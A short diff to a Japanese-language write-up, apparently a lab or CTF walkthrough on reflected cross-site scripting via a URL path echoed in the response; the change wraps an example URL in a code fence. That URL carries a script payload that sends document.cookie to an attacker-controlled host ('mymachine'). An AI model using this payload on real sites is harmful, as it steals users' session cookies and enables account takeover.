@@ -96,7 +96,9 @@ URLのうち、ドメイン以下の部分がレスポンスに含まれてい�
 `script src`から存在しないURLを指定し、ボディ内のJavaScriptが返ってくれば動作することが期待できる。
 
 下記のように書いた場合、スクリプトを含むボディを返すことができる。
+```
 https://target_IP/'; new Audio('http://mymachine/' + document.cookie);//
+```
 
 ```HTTP
 HTTP/1.1 200 OK
